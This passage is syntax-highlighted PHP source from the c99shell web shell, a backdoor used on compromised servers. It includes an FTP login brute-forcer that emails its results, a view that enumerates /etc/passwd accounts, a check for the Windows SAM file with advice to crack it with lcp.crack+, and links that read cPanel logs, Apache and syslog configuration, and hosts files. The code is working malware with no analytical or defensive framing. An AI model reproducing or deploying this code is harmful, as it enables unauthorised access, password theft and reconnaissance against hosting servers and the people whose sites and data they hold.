class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;</span>
<span class="s2">------------------------------------------</span>
<span class="s2">Done!</span>
<span class="s2">Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">Success.: &quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">,</span><span class="s2">&quot;c99shell v. &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot; report&quot;</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">);}</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">);</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$logfile</span> <span class="o">=</span> <span class="nv">$tmpdir_logs</span><span class="o">.</span><span class="s2">&quot;c99sh_ftpquickbrute_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y_H_i_s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">;</span>
   <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$logfile</span><span class="p">);</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">ftpquickbrute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;Read first: &amp;lt;input type=text name=</span><span class="se">\&quot;</span><span class="s2">fqb_lenght</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwdperpage</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Users only with shell?&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_onlywithsh</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;Logging?&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logging</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;br&amp;gt;Logging to file?&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logfile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$logfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;Logging to e-mail?&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logemail</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$log_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Brute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Permision denied!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Directory information:&amp;lt;/b&amp;gt;&amp;lt;table border=0 cellspacing=1 cellpadding=2&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Owner/Group&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="p">;</span>
   <span class="nv">$ow</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
   <span class="nv">$gr</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
   <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">:</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Perms&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;chmod&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Create time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filectime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Access time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">fileatime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;MODIFY time&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt; &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d/m/Y H:i:s&quot;</span><span class="p">,</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;phpinfo&quot;</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="nx">c99shexit</span><span class="p">();}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;security&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server security information:&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;b&amp;gt;Open base dir: &quot;</span><span class="o">.</span><span class="nv">$hopenbasedir</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$win</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$nixpasswd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;*nix /etc/passwd:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_s</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nixpwd_s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_e</span><span class="p">))</span> <span class="p">{</span><span class="nv">$nixpwd_e</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">security</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">nixpasswd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;From:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text=</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">nixpwd_s</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwd_s</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;b&amp;gt;To:&amp;lt;/b&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">nixpwd_e</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwd_e</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">View</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$nixpwd_s</span><span class="p">;</span>
   <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$nixpwd_e</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;security&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.nixpasswd.value=&#39;1&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;Get /etc/passwd&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">epair\sam&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=red&amp;gt;You can&#39;t crack winnt passwords(&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;) &amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;You can crack winnt passwords. &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;sam&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;\/repair&#39;;document.todo.ft.value=&#39;download&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Download&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;, and use lcp.crack+ .&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/userdomains&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;userdomains&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/etc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;View cpanel user-domains logs&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/var/cpanel/accounting.log&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;accounting.log&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/var/cpanel/&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;View cpanel logs&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/usr/local/apache/conf/httpd.conf&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;httpd.conf&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/usr/local/apache/conf&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Apache configuration (httpd.conf)&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/httpd.conf&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;httpd.conf&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/etc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Apache configuration (httpd.conf)&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/syslog.conf&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;syslog.conf&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/etc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Syslog configuration (syslog.conf)&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/motd&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;motd&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/etc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Message Of The Day&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;/etc/hosts&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;f&#39;;document.todo.f.value=&#39;hosts&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;/etc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.ft.value=&#39;txt&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;&amp;lt;b&amp;gt;Hosts&amp;lt;/b&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">function</span> <span class="nf">displaysecinfo</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$value</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot; - &amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="nv">$name</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}}</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;OS Version?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;cat /proc/version&quot;</span><span class="p">));</span>
